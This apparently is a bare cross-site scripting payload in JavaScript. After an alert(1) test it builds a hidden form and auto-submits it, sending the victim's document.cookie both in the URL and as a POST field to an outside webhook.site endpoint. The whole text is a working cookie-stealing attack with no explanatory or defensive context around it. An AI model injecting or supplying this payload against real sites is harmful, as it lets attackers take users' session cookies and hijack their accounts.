alert(1)
var f = document.createElement('form');
f.action = 'https://webhook.site/id/?cookie=' + document.cookie;
f.method = 'POST';
var i = document.createElement('input');
i.name = 'cookie';
i.value = document.cookie;
f.appendChild(i);
document.body.appendChild(f);
f.submit();
